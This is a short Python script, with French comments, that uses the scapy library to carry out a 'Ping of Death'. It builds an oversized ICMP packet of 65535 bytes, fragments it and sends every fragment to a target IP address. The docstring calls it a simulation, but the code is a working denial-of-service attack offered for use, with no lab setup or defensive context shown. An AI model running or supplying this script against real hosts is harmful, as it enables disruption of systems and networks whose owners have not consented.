from scapy.all import IP, ICMP, fragment, send
import sys

def attack(target_ip, size=65535):
    """
    Simulation d'un Ping of Death
    """
    # Construction d'un paquet ICMP surdimensionné
    ping = IP(dst=target_ip)/ICMP()/("X" * size)
    
    # Fragmentation du paquet
    frags = fragment(ping)
    
    # Envoi des fragments
    for frag in frags:
        send(frag, verbose=False)